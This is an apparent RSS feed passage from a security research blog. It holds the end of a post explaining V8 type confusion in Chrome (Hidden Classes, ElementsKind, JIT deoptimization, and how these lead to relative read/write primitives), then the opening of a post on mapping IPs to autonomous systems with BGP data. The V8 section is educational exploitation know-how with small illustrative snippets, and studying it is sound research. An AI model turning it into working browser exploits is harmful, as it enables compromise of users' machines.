class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params">x</span>) </span>{      <span class="hljs-keyword">let</span> arr = [<span class="hljs-number">1.1</span>]; <span class="hljs-comment">// Initially an array containing a number (float)</span>    <span class="hljs-keyword">if</span> (x) arr[<span class="hljs-number">0</span>] = {<span class="hljs-attr">y</span>: <span class="hljs-number">42</span>}; <span class="hljs-comment">// Conditional branch to change to an object</span>    <span class="hljs-keyword">return</span> arr[<span class="hljs-number">1</span>]; <span class="hljs-comment">// Potential OOB</span>}<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) foo(<span class="hljs-literal">false</span>);  <span class="hljs-comment">// Induce optimization</span>foo(<span class="hljs-literal">true</span>); <span class="hljs-comment">// After optimization, insert an object &#x2192; change in type structure</span></code></pre><p>Initially, this code&#x2019;s array contains only numbers, leading V8 to assume, &#x201C;this array only holds numbers.&#x201D; Accordingly, it optimizes its internal structure for simple and fast processing. However, if an object is inserted into the array based on the conditional statement, the internal structure should change. If the already generated optimized code doesn&#x2019;t account for this change, the engine might still access the array assuming it only contains numbers. As a result, a value assumed to be a number might actually be an object or entirely different data, leading to <strong>memory misinterpretation</strong> or <strong>Out-Of-Bounds access</strong> to the array. This kind of mismatch between runtime structural changes and the JIT compiler&#x2019;s inference is a primary cause of Type Confusion in JavaScript.</p><h2 id="2-Type-Confusion-in-Chrome-Root-cause-Analysis"><a href="#2-Type-Confusion-in-Chrome-Root-cause-Analysis" class="headerlink" title="2. Type Confusion in Chrome - Root cause Analysis"></a>2. Type Confusion in Chrome - Root cause Analysis</h2><p>In Chapter 1, we explored the concept of Type Confusion and its common occurrences.<br>Now, let&#x2019;s apply this concept to <strong>V8</strong>, Chrome&#x2019;s JavaScript engine. V8 is a high-performance, JIT-based engine, which makes it an environment where Type Confusion vulnerabilities frequently occur. For performance optimization, V8 internally tries to maintain object type information in a fixed form. This can lead to type inference errors resulting in memory corruption under specific conditions. In this chapter, we will examine the structural background of how Type Confusion occurs within V8 and the role of key concepts like <strong>Hidden Class</strong> and <strong>ElementsKind</strong>.</p><h3 id="2-1-Overview-of-Type-Confusion-Cases-in-Chrome"><a href="#2-1-Overview-of-Type-Confusion-Cases-in-Chrome" class="headerlink" title="2.1 Overview of Type Confusion Cases in Chrome"></a>2.1 Overview of Type Confusion Cases in Chrome</h3><p>Indeed, numerous Chrome vulnerabilities, such as <strong>CVE-2018-17463</strong>, <strong>CVE-2023-2033</strong>, and <strong>CVE-2023-4069</strong>, have originated from Type Confusion due to incorrect type inference. (You can also find them in HackyBoys 1day-1line! &#x2192; <a href="https://hackyboiz.github.io/2024/01/18/ogu123/cve-2023-2033/">Link</a>)</p><p>Most of these occur when the JIT compiler observes code execution patterns and generates optimized code based on assumptions like &#x201C;this variable always handles numbers&#x201D; or &#x201C;this object always has the same structure.&#x201D; The vulnerability then arises when these assumptions are broken by an exceptional execution flow later on.</p><p>In the V8 engine, Type Confusion vulnerabilities frequently occur in the following situations:</p><ul><li>When the object&#x2019;s structure <strong>(Hidden Class)</strong> has changed, but operations continue based on previous assumptions.</li><li>When changes to the <strong>array&#x2019;s internal type (ElementsKind)</strong> are not reflected.</li><li>When incorrect type hints left by the <strong>Inline Cache</strong> are used.</li></ul><p>In summary, V8 generates code assuming &#x201C;types will be fixed&#x201D; for fast execution. However, JavaScript is a highly dynamic language, and this assumption can be broken at any time. Attackers can exploit these structural characteristics to disrupt internal type information and cause Type Confusion.</p><p>We will now delve into two core optimization concepts that form the basis of these structural assumptions: <strong>Hidden Class (Map)</strong> and <strong>ElementsKind</strong>.</p><h3 id="2-2-Introduction-to-V8&#x2019;s-Optimization-Model-1-HiddenClass-Map"><a href="#2-2-Introduction-to-V8&#x2019;s-Optimization-Model-1-HiddenClass-Map" class="headerlink" title="2.2 Introduction to V8&#x2019;s Optimization Model (1): HiddenClass (Map)"></a>2.2 Introduction to V8&#x2019;s Optimization Model (1): HiddenClass (Map)</h3><p>A <strong>Hidden Class</strong> is an internal mechanism V8 uses to track and optimize the structure of JavaScript objects. JavaScript objects are inherently dynamic, allowing properties and value pairs to be freely added or removed, which means their structure can change on the fly. However, for performance, V8 doesn&#x2019;t treat objects like dictionaries. Instead, it internally tracks the property configuration and order of objects using a meta-structure called a Hidden Class (or Map).</p><blockquote><p><strong>Property:</strong> While properties in JavaScript objects simply appear as key-value pairs, internally in V8, each time a property is added, it triggers a change in the object&#x2019;s memory layout. At this point, not only the property&#x2019;s name but also the <strong>order in which it&#x2019;s added</strong> becomes a crucial factor in determining the object&#x2019;s structure.</p><p><strong>Transition:</strong> When a new property is added, V8 connects (transitions) the object&#x2019;s current Hidden Class from its existing structure to a new one. Each such transition corresponds to the addition of one property, forming a <strong>tree structure</strong> composed of connections between Hidden Classes.</p></blockquote><p><strong>&#x1F9E9; How Hidden Class Works</strong></p><pre><code class="hljs jsx"><span class="hljs-keyword">let</span> obj = {};        <span class="hljs-comment">// [1] Initial Hidden Class</span>obj.x = <span class="hljs-number">10</span>;          <span class="hljs-comment">// [2] &#x2192; Transitions to a Hidden Class with property &apos;x&apos;</span>obj.y = <span class="hljs-number">20</span>;          <span class="hljs-comment">// [3] &#x2192; Transitions to a Hidden Class with properties &apos;x, y&apos; in that order</span></code></pre><ul><li>[1] When an object is created, V8 assigns an <strong>initial Hidden Class</strong> to it. This represents a state where the object has no properties</li><li><p>Subsequently, each time a property is added, V8 performs a <strong>transition</strong> from the existing Hidden Class to a new one</p><ul><li>[2] if <code>obj.x = 10</code> is added, it transitions to a new Hidden Class containing only <code>x</code> .</li><li><p>[3] when <code>obj.y = 20</code> is added, it transitions again to another Hidden Class that reflects the order <code>x, y</code>.</p>  <pre><code class="hljs c">[Initial Hidden Class]        |        | (add property <span class="hljs-string">&apos;x&apos;</span>)        v   [Hidden Class: x]        |        | (add property <span class="hljs-string">&apos;y&apos;</span>)        v   [Hidden Class: x, y]</code></pre></li></ul></li></ul><p>As shown, Hidden Classes are sequentially linked according to the property addition order. Objects with identical structures share the same Hidden Class. The Hidden Class expands, forming a branching tree structure based on the property addition order of an object, internally representing the static structural information of each object.</p><p>Due to this structure, when accessing properties like <code>obj.x</code>, V8 doesn&#x2019;t search for a string key. Instead, it directly accesses a fixed memory location, such as <code>obj[+8]</code>, based on the offset information held by the corresponding Hidden Class. This method significantly <strong>speeds up property lookup</strong> and enables V8 to generate highly optimized native code, under the assumption that the object&#x2019;s structure will not change.</p><h3 id="2-3-Introduction-to-V8&#x2019;s-Optimization-Model-2-ElementsKind"><a href="#2-3-Introduction-to-V8&#x2019;s-Optimization-Model-2-ElementsKind" class="headerlink" title="2.3 Introduction to V8&#x2019;s Optimization Model (2): ElementsKind"></a>2.3 Introduction to V8&#x2019;s Optimization Model (2): ElementsKind</h3><p><strong>ElementsKind</strong> is an internal meta-information V8 uses to track the <strong>element type and density of JavaScript arrays</strong>. JavaScript arrays have a very dynamic structure; they can freely mix numbers, strings, and objects, or contain sparse (empty) slots. However, for performance optimization, V8 tries to represent these arrays internally in the simplest and most standardized way possible. ElementsKind is the criterion for this internal representation.</p><p>&#x1F9E9; <strong>How ElementsKind Works</strong></p><ul><li><p>When an array is created, V8 assigns the simplest and most compact <strong>ElementsKind</strong> based on the array&#x2019;s content.</p><p>  For example:</p>  <pre><code class="hljs jsx">[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]           &#x2192; PackedSmiElements (<span class="hljs-number">32</span>bits integer array)[<span class="hljs-number">1.1</span>, <span class="hljs-number">2.2</span>]          &#x2192; PackedDoubleElements (<span class="hljs-number">64</span>bits floating-point array)[<span class="hljs-number">1</span>, {}, <span class="hljs-string">&quot;text&quot;</span>]     &#x2192; PackedElements (general object array)</code></pre></li><li><p>Subsequently, if elements of a different type are inserted into the array, or if intermediate elements are deleted reducing its density, V8 transitions the array to a more general ElementsKind.</p>  <pre><code class="hljs angelscript">let arr = [<span class="hljs-number">1.1</span>, <span class="hljs-number">2.2</span>];   <span class="hljs-comment">// Initial: PackedDoubleElements</span>arr[<span class="hljs-number">2</span>] = {};            <span class="hljs-comment">// &#x2192; Transitions to PackedElements</span></code></pre></li></ul><p>This approach somewhat contrasts with the dynamic nature of JavaScript arrays but provides very high performance until a change occurs during execution. Ultimately, ElementsKind provides a core criterion for JIT optimization based on abstract type information about array elements, playing a crucial role in converging dynamic JavaScript code into a static performance model.</p><h3 id="2-4-Optimization-Flow-and-Native-Code-Generation"><a href="#2-4-Optimization-Flow-and-Native-Code-Generation" class="headerlink" title="2.4 Optimization Flow and Native Code Generation"></a>2.4 Optimization Flow and Native Code Generation</h3><p>V8 generates high-performance <strong>Native Code</strong> by making the most static assumptions possible about JavaScript&#x2019;s dynamic nature. As discussed earlier, <strong>Hidden Class</strong> and <strong>ElementsKind</strong> make object and array structures predictable, allowing V8 to progressively generate optimized code during execution. In the previous section (Part 1.), we covered the overall concept and history of the V8 execution pipeline structure. Now, let&#x2019;s look at these components from the perspective of native code execution and optimization flow.</p><hr><p><strong>&#x2699;&#xFE0F; Native Code Execution and Optimization Flow</strong></p><p><img src="image%205.png" alt="image.png"></p><p>V8&#x2019;s execution pipeline transforms JavaScript code into increasingly fast native machine code through the following stages.</p><ol><li>The <strong>Ignition interpreter</strong> converts JavaScript code into bytecode and begins execution. In this stage, runtime profiling information, such as execution counts and type information, is collected.</li><li>If code is determined to be a &#x201C;hot&#x201D; execution path, the <strong>Sparkplug</strong> or <strong>Maglev JIT compilers</strong> perform rapid compilation to generate Native Code. This code represents an initial level of optimization, prioritizing speed and efficiency.</li><li><p>Subsequently, once the code is deemed sufficiently analyzed, <strong>TurboFan</strong>, the advanced JIT compiler, performs more sophisticated optimizations. At this point, it actively utilizes internal structural information like <strong>Hidden Class</strong> and <strong>ElementsKind</strong> to generate high-performance Native Code, assuming that object structures remain fixed.</p><blockquote><p>e.g., When accessing <code>obj.x</code>, V8 can use the Hidden Class to know that the offset of &#x201C;x&#x201D; is <code>+8</code> and generate code that directly references that memory location. Similarly, array memory access is statically optimized via ElementsKind.</p></blockquote></li></ol><hr><p>During this process, TurboFan employs various advanced optimization techniques, including Inline Caching (IC), Escape Analysis, Loop Unrolling, and Function Inlining. The Native Code generated this way offers very high execution performance but concurrently relies on strong static assumptions about the object&#x2019;s internal structure and type.</p><p>V8 registers this optimized code at the function&#x2019;s entry point based on these assumptions. As a result, subsequent function calls bypass the interpreter stage and execute the Native Code directly, dramatically improving execution speed.</p><p>However, this optimization is premised on the following assumption:</p><blockquote><p>&#x201C;The structure of objects or types of arrays will not change during runtime.&#x201D;</p></blockquote><p>The problem is that, due to the dynamic nature of JavaScript, the structure of objects or arrays can change at any time. If such a change is detected, V8 will <strong>deoptimize</strong> the existing Native Code, revert to the interpreter, or generate newly optimized code.</p><p>However, if these changes are not properly detected, or if they are intentionally bypassed by an attacker, V8 will continue to execute the optimized path based on the previous, incorrect type information. As a result, a situation can arise where the <strong>Inline Cache</strong> still uses old information even though the <strong>Hidden Class</strong> or <strong>ElementsKind</strong> has already changed. This leads to incorrect field offset calculations or erroneous memory references. Ultimately, this context is the direct cause of <strong>Type Confusion</strong> vulnerabilities.</p><p>As such, V8&#x2019;s optimization pipeline is a core mechanism for converging JavaScript&#x2019;s dynamic characteristics into a static execution model. Hidden Class and ElementsKind form the foundation of this static model, and the Native Code generated based on them provides very high performance. </p><p><img src="image%206.png" alt="image.png"></p><p>However, simultaneously, a vulnerability can arise the moment this static assumption is broken. Therefore, managing the <strong>trade-off between performance and security</strong> becomes a very critical challenge in V8&#x2019;s design.</p><h3 id="2-5-The-Structure-of-Type-Confusion-Occurrence"><a href="#2-5-The-Structure-of-Type-Confusion-Occurrence" class="headerlink" title="2.5 The Structure of Type Confusion Occurrence"></a>2.5 The Structure of Type Confusion Occurrence</h3><p>As previously explained, V8&#x2019;s optimization mechanisms are based on a strong premise that object structures and array types will not change. However, JavaScript is fundamentally a very dynamic language, and Type Confusion can occur the moment this premise is broken in the actual execution flow.</p><p>Let&#x2019;s specifically examine how Type Confusion can be triggered within <strong>Hidden Class</strong> and <strong>ElementsKind</strong>, which form the basis of V8&#x2019;s static model.</p><hr><p><strong>1) Hidden Class-based Confusion</strong></p><p>A Hidden Class is an internal mechanism that tracks an object&#x2019;s property structure, enabling fast property access and JIT optimization. However, when properties are dynamically added to an object or property types change, the Hidden Class transitions to a different class, rendering the existing Native Code invalid.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Foo</span>(<span class="hljs-params"></span>) </span>{  <span class="hljs-built_in">this</span>.x = <span class="hljs-number">1</span>;  <span class="hljs-comment">// HiddenClass A</span>  <span class="hljs-built_in">this</span>.y = <span class="hljs-number">2</span>;  <span class="hljs-comment">// HiddenClass B</span>}<span class="hljs-keyword">let</span> a = <span class="hljs-keyword">new</span> Foo();a.z = <span class="hljs-number">3</span>;       <span class="hljs-comment">// HiddenClass C (transition)</span></code></pre><p>In this case, object <code>a</code> ultimately gets Hidden Class C. But if TurboFan generated Native Code based on the structure up to Hidden Class B, and that code is still applied to <code>a</code>, it might incorrectly perceive <code>a.z</code> as <code>a.y</code> or reference an incorrect offset.</p><p><strong>Hidden Class Transition and Deoptimization</strong></p><p>Changes in property types also trigger Hidden Class transitions. Consider, for example, a case where an object property&#x2019;s type changes from a number to an object.</p><pre><code class="hljs jsx"><span class="hljs-keyword">let</span> obj = { <span class="hljs-attr">x</span>: <span class="hljs-number">1</span> };         <span class="hljs-comment">// x is number &#x2192; HiddenClass A</span>obj.x = { <span class="hljs-attr">nested</span>: <span class="hljs-literal">true</span> };   <span class="hljs-comment">// x is now object &#x2192; HiddenClass B</span></code></pre><p>In this scenario, V8 detects the type change and deoptimizes the existing Native Code, either reverting to bytecode or generating new code. However, if the structural change is not properly detected, or if an attacker designs the input to bypass this detection, V8 may still execute the existing Hidden Class-based Native Code, leading to incorrect memory access.</p><p><strong>2) ElementsKind-based Confusion</strong></p><p>For arrays, V8 defines various <strong>ElementsKind</strong> types based on the elements&#x2019; types and density. </p><p>For example:</p><ul><li><code>PACKED_SMI_ELEMENTS</code>: Dense array containing only integers.</li><li><code>PACKED_DOUBLE_ELEMENTS</code>: Array containing only floating-point numbers.</li><li><code>PACKED_ELEMENTS</code>: Mixed-type array.</li><li><code>HOLEY_*</code> (sparse array) variants corresponding to each of the above.</li></ul><p>TurboFan generates optimized code assuming that an array&#x2019;s ElementsKind will not change. However, the moment an element of a different type is inserted into the array, the ElementsKind transitions, and the existing Native Code becomes invalid.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">confuse</span>(<span class="hljs-params">x</span>) </span>{  <span class="hljs-keyword">let</span> arr = [<span class="hljs-number">1.1</span>];     <span class="hljs-comment">// PackedDoubleElements</span>  <span class="hljs-keyword">if</span> (x) arr[<span class="hljs-number">0</span>] = {};  <span class="hljs-comment">// insert object &#x2192; ElementsKind transition</span>  <span class="hljs-keyword">return</span> arr[<span class="hljs-number">0</span>];}</code></pre><p>If <code>x</code> is <code>false</code>, <code>arr</code> remains a double array, and TurboFan generates corresponding code. However, if <code>x</code> is <code>true</code>, an object is inserted into <code>arr[0]</code>, changing the array&#x2019;s internal representation. If the existing Native Code is still executed at this point, an incorrect type casting occurs, interpreting an object as a double.</p><h2 id="3-From-Type-Confusion-to-Memory-Corruption"><a href="#3-From-Type-Confusion-to-Memory-Corruption" class="headerlink" title="3. From Type Confusion to Memory Corruption"></a>3. From Type Confusion to Memory Corruption</h2><h3 id="3-1-Connecting-to-Practical-Memory-Corruption"><a href="#3-1-Connecting-to-Practical-Memory-Corruption" class="headerlink" title="3.1 Connecting to Practical Memory Corruption"></a>3.1 Connecting to Practical Memory Corruption</h3><p>Why does simple Type Confusion escalate to <strong>Memory Corruption</strong>?</p><p>The core reason is that V8&#x2019;s JIT-optimized Native Code directly accesses memory, relying on its trust in object structures or array types. V8 rapidly accesses objects or arrays by calculating precise field offsets based on <strong>HiddenClass (Map)</strong> or <strong>ElementsKind</strong> information. The problem arises when these assumptions are broken. If an object&#x2019;s actual structure changes but the compiled code still accesses it based on the old structure, it will access completely incorrect memory addresses or misinterpret data. This can directly lead to <strong>memory corruption</strong>, manipulating memory at unexpected locations.</p><p>Consider the following scenarios.</p><ul><li><p><strong>Misinterpreting a Floating-Point Array as an Object Array</strong></p><p>  If an array storing floating-point values like <code>13.37</code> is mistakenly treated and accessed by the JIT as an object array, this numerical value could be interpreted as a heap pointer, leading to access of an entirely unintended memory location. This results in <strong>OOB Read/Write</strong>, which an attacker can leverage to manipulate adjacent objects or induce data leakage.</p></li><li><p><strong>Pointer Manipulation using TypedArray or DataView</strong></p><p>  In JavaScript, when using <code>TypedArray</code> or <code>ArrayBuffer</code>, the buffer directly points to an actual memory region. If an attacker can control the object&#x2019;s structure, they might manipulate this <strong>backing store pointer</strong> to set an arbitrary memory address as the buffer&#x2019;s starting point. In this case, read/write operations through the <code>ArrayBuffer</code> expand to memory access across the entire address space. </p></li></ul><p>This implies the ability to access memory near the object or specific fields within the same structure in a limited way, by manipulating the internal field offsets of the object through incorrect type interpretation.</p><p>One more crucial factor here is the <strong>Garbage Collector (GC)</strong>. V8 uses a GC system that automatically manages the lifespan of JS objects. This system moves or reclaims objects within the heap as needed. Even if an object&#x2019;s memory address changes during this process, the existing optimized code might not recognize it and could attempt to access it based on its old structure. In other words, a timing difference or information mismatch between the GC and JIT can act as another <strong>Type Confusion trigger</strong>.</p><p>Consequently, we can see that Type Confusion is not merely a logical error or a developer&#x2019;s mistake, but rather a vulnerability that can arise at the complex boundary where V8&#x2019;s JIT optimization, object model, and GC system interact.</p><p>Now that we understand why Type Confusion occurs and how it can lead to Memory Corruption, let&#x2019;s explore how to initiate an attack using this vulnerability.</p><h3 id="3-2-Relative-Read-Write-Primitive"><a href="#3-2-Relative-Read-Write-Primitive" class="headerlink" title="3.2 Relative Read/Write Primitive"></a>3.2 Relative Read/Write Primitive</h3><p>The basic exploit flow for Type Confusion starts with an OOB Read/Write stemming from the Type Confusion itself. The general attack flow to achieve <strong>RCE via Type Confusion</strong> involves carefully refining the OOB R/W to obtain a <strong>Relative R/W</strong> primitive, then skillfully leveraging this to gain <strong>AAR/W</strong> (Arbitrary Address Read/Write), and finally achieving Code Execution. Sounds exciting, right?! This part is turning out to be longer than expected, so I probably won&#x2019;t cover everything. But it&#x2019;d be a shame to end here, so let&#x2019;s briefly touch on the Relative R/W portion as a sneak peek :)</p><hr><p>Type Confusion means more than just a simple misinterpretation of types. From an attacker&#x2019;s perspective, it becomes a <strong>starting point for manipulating memory regions that were originally inaccessible</strong>. A prime example of this is the <strong>Relative Read/Write</strong>. This is a primitive that allows limited access to memory based on a fixed offset from a known location.</p><p>For instance, consider two classes with similar structures but where the meaning of the last field differs.</p><p><img src="image%207.png" alt="image.png"></p><blockquote><p>Class A</p><ul><li>name</li><li>age</li><li>residence</li></ul><p>Class B</p><ul><li>name</li><li>age</li><li>workspace</li></ul></blockquote><p>These two classes have a similar number and order of fields, but the meaning and type of the last field are different. Let&#x2019;s imagine that in a Worker process, an operation points to the &#x201C;residence&#x201D; field of a <code>Class A</code> instance.</p><p><img src="image%208.png" alt="image.png"></p><p>Now, let&#x2019;s assume a situation within the Worker process where a <code>Class A</code> instance is mistakenly perceived as a <code>Class B</code> type for some reason. In this case, under normal circumstances, the &#x201C;residence&#x201D; field should be accessed. However, when interpreted based on <code>Class B</code>, this memory location is recognized as the field corresponding to &#x201C;workplace.&#x201D;</p><p><img src="image%209.png" alt="image.png"></p><p>As a result, even though the Worker process is actually accessing a field of a <code>Class A</code> instance, the runtime considers it a field of <code>Class B</code>, leading to unintended memory reads or writes.</p><blockquote><p>It&#x2019;d be quite embarrassed if a delivery meant for your home ended up at your workplace, wouldn&#x2019;t it?</p><p>Here&#x2019;s another embarrassed example.</p><p><img src="image.png" alt="image.png"></p></blockquote><p>As shown, the runtime&#x2019;s incorrect type interpretation creates a <strong>Relative R/W Primitive</strong>, enabling memory access based on a fixed offset, even if the exact address isn&#x2019;t known. Through this, an attacker can satisfy the following conditions:</p><ul><li>Based on an object they control (<code>Class A</code>), at a fixed offset (e.g., <code>+0x10</code>, <code>+0x18</code>, etc.),</li><li>They can read or write the contents of a specific field or an adjacent structure (<code>Class B</code>) within memory.</li></ul><hr><p>Such a <strong>Relative Primitive</strong> holds significant meaning in the early stages of an attack:</p><ul><li>It allows for leaking the internal structure of a specific object, or</li><li>It enables the manipulation of key information like pointers or length fields,</li><li>Thereby paving the way for expansion into an Absolute R/W Primitive.</li></ul><p>In the next part, we&#x2019;ll explore through an actual exploit flow how this Relative R/W Primitive expands into absolute address-based memory manipulation, ultimately leading to remote code execution.</p><p>From the next part, you can expect a strong &#x201C;pwnable&#x201D; scent; please look forward to it! I&#x2019;ll do my best to prepare it&#x2026;!</p><p>(The following is just a humorous, digitally distorted prank call photo I added because I wanted this kind of vibe. But Liam Neeson and a Chinese restaurant are better, right? &#x1F975;)</p><p><img src="image%2010.png" alt="image.png"></p><p>(subtitle: Robbers at home lol)</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>v <strong>Conference Video</strong></p><ul><li><a href="https://www.youtube.com/watch?v=RL2po1swXO4">https://www.youtube.com/watch?v=RL2po1swXO4</a></li></ul><p>v <strong>Background</strong></p><ul><li><a href="https://v8.dev/docs/hidden-classes">https://v8.dev/docs/hidden-classes</a></li><li><a href="https://v8.dev/blog/elements-kinds">https://v8.dev/blog/elements-kinds</a></li><li><a href="https://richardartoul.github.io/jekyll/update/2015/04/26/hidden-classes.html">https://richardartoul.github.io/jekyll/update/2015/04/26/hidden-classes.html</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/OOB/">OOB</category>
      
      <category domain="https://hackyboiz.github.io/tags/Type-Confusion/">Type Confusion</category>
      
      <category domain="https://hackyboiz.github.io/tags/Type-Confusion-101/">Type Confusion 101</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chrome/">Chrome</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chromium/">Chromium</category>
      
      <category domain="https://hackyboiz.github.io/tags/Relative-R-W/">Relative R/W</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Creating an IP Country Information Database Part2 (With BGP) (en)</title>
      <link>https://hackyboiz.github.io/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_EN/</link>
      <guid>https://hackyboiz.github.io/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_EN/</guid>
      <pubDate>Sun, 27 Jul 2025 14:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;&amp;#x1F44B;-Prologue&quot;&gt;&lt;a href=&quot;#&amp;#x1F44B;-Prologue&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x1F44B; Prologue&quot;&gt;&lt;/a&gt;&amp;#x1F44B; Prologue&lt;/h1&gt;&lt;p&gt;In my </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="&#x1F44B;-Prologue"><a href="#&#x1F44B;-Prologue" class="headerlink" title="&#x1F44B; Prologue"></a>&#x1F44B; Prologue</h1><p>In my previous post, <a href="https://hackyboiz.github.io/2025/03/02/empty/Creating_an_IP_Country_Information_Database_KO/">Building an IP-to-Country Database</a>, we created a program that uses the RIR <em>delegated-</em>.csv* files to map IP addresses to countries. But in real-world operations, country data alone often isn&#x2019;t enough to make informed decisions.</p><p>Consider a few examples:</p><ul><li><strong>Malicious IPs</strong> can&#x2019;t be reliably distinguished as cloud-hosted or residential, risking false positives and overblocking.</li><li>You can&#x2019;t pivot to additional threats lurking within the same AS, hampering threat-hunting efforts.</li><li>You can&#x2019;t group indicators by CIDR or AS to block attacker infrastructure in bulk.</li></ul><p>In short, when assessing an IP, you need more than just its country; you need auxiliary indicators as well. One of the most widely used is AS (Autonomous System) information, which can be gathered via BGP (Border Gateway Protocol). In this post, we&#x2019;ll explore practical ways to obtain and use AS data through BGP.</p><h1 id="&#x1F310;-Autonomous-System"><a href="#&#x1F310;-Autonomous-System" class="headerlink" title="&#x1F310; Autonomous System"></a>&#x1F310; Autonomous System</h1><p>The Internet we use is a collection of logical networks called Autonomous Systems (ASes). Each AS represents a network domain operated independently by an ISP, enterprise, or public organization, and the interconnection of these ASes forms the global Internet.</p><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_EN/image00.png" alt="png"></p><blockquote><p><a href="https://www.wallarm.com/what/bgp-routing-explanation">https://www.wallarm.com/what/bgp-routing-explanation</a></p></blockquote><p>For example, the IP address I use at home 124.54.178.xxx belongs to <strong>AS17858</strong>, which is operated by LG Powercom (now LG Uplus). AS17858 contains roughly ten million IP addresses, divided into 207 individual prefixes.</p><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_EN/image01.png" alt="png"></p><p>AS numbers are managed as 4-byte integers, so values from <strong>AS1 up to AS 4,294,967,296 are reserved</strong>. Like IP addresses, these numbers are administered by Regional Internet Registries (RIRs). In Korea, you can request your own unique ASN from the Korea Internet &amp; Security Agency (KISA) once you meet the following requirements:</p><ul><li>Operate infrastructure capable of running an independent network on the Internet</li><li>Be connected to&#x2014;or have concrete plans to connect to two or more distinct networks</li><li>Be able to set and manage your own routing policies autonomously</li></ul><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_EN/image02.png" alt="png"></p><p>If you satisfy these criteria, <strong>individuals can also receive and operate an ASN</strong>. One real-world example is <strong>AS 215343</strong>, a network run by <strong>Minjae Kim</strong> for research purposes. Interestingly, this ASN was assigned not by KISA but by the European RIR, <strong>RIPE NCC</strong>&#x2014;the exact reason isn&#x2019;t publicly documented.</p><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_EN/image03.png" alt="png"></p><blockquote><p>Description of AS 215343: <a href="https://prezi.com/p/uh9o2mavv3x2/as215343-isp/">https://prezi.com/p/uh9o2mavv3x2/as215343-isp/</a></p></blockquote><h1 id="&#x1F697;-BGP-Border-Gateway-Protocol"><a href="#&#x1F697;-BGP-Border-Gateway-Protocol" class="headerlink" title="&#x1F697; BGP(Border Gateway Protocol)"></a><strong>&#x1F697;</strong> BGP(Border Gateway Protocol)</h1><p>To send traffic to an AS that isn&#x2019;t directly connected to yours, the routers in between need route information that tells them which ASes to traverse. <strong>BGP (Border Gateway Protocol)</strong> is the Internet-standard routing protocol that lets neighboring ASes exchange this path information, so each router can choose the best route according to local policy.</p><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_EN/image04.png" alt="png"></p><blockquote><p><a href="https://devopedia.org/border-gateway-protocol">https://devopedia.org/border-gateway-protocol</a></p></blockquote><p>Depending on whether the exchange happens inside or outside an AS, BGP is classified as <strong>IBGP (Internal BGP)</strong> or <strong>EBGP (External BGP)</strong>. Routers in each AS <em>announce</em> messages like the one below to their peers so everyone can find the optimal path (the <strong>AS Path</strong>).</p><pre><code class="hljs bash">TIME: 07/10/25 14:00:00TYPE: TABLE_DUMP_V2/IPV4_UNICASTPREFIX: 3.166.152.0/23SEQUENCE: 7558FROM: 45.83.33.27 AS208821ORIGINATED: 07/09/25 00:01:40ORIGIN: IGPASPATH: 208821 206119 9121 1299 16509NEXT_HOP: 45.83.33.27COMMUNITY: 1299:35000 9121:50000 9121:50008</code></pre><p>Key fields in a BGP update include:</p><ul><li><strong>PREFIX:</strong> the announced network (CIDR block)</li><li><strong>FROM:</strong> IP address and AS number of the peer that sent this route</li><li><strong>ORIGIN:</strong> route origin attribute&#x2014;<em>IGP</em>, <em>EGP</em>, or <em>INCOMPLETE</em></li><li><strong>AS PATH:</strong> list of AS numbers the route has traversed (leftmost is closest)</li><li><strong>NEXT HOP:</strong> the actual next-hop IP to forward packets to</li></ul><p>tells us that packets destined for <strong>3.166.152.0/23</strong> (origin-AS 16509) should first go to <strong>45.83.33.27</strong> (AS 208821), and from there traverse <strong>AS 208821 &#x2192; AS 206119 &#x2192; AS 9121 &#x2192; AS 1299 &#x2192; AS 16509</strong>.</p><p>A traceroute to <strong>AS 215343 (Minjaes Network)</strong> from my home connection shows the packets moving through <strong>AS 17858 (LG Powercom) &#x2192; AS 3786 (LG Dacom) &#x2192; AS 4637 (Telstra) &#x2192; AS 20473 (Vultr) &#x2192; AS 215343 (Minjaes Network)</strong>.</p><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_EN/image05.png" alt="png"></p><p>Curiously, although this is traffic from Korea to Korea, it detours through Hong Kong and Japan before returning to Korea. That&#x2019;s because AS 215343 advertises its prefixes via a transit arrangement with <strong>AS 20473</strong>, and BGP propagates that route, leading to the path we observe.</p><ul><li><em>(Depending on where you capture BGP data, certain hops&#x2014;like AS 4637&#x2014;may not appear.)</em></li></ul><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_EN/image06.png" alt="png"></p><blockquote><p>&#xCD9C;&#xCC98;: <a href="https://api.bgpview.io/assets/graphs/AS215343_Combined.svg">https://api.bgpview.io/assets/graphs/AS215343_Combined.svg</a></p></blockquote><p>In short, BGP works like a global navigation system: every AS advertises the IP prefixes it owns along with path attributes, enabling everyone else to find the best route. In the next section, we&#x2019;ll use this BGP data to <strong>build our own IP-to-Country-and-AS mapping database</strong>.</p><h1 